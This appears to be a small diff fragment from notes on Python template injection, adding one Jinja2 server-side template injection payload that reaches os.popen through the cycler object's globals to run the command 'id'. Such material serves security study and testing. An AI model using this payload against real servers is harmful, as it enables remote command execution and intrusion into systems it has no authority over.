@@ -22,3 +22,7 @@ or
     
 Gadgets. In python, everything is an object.
 
+
+    {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()
+ 
+ 
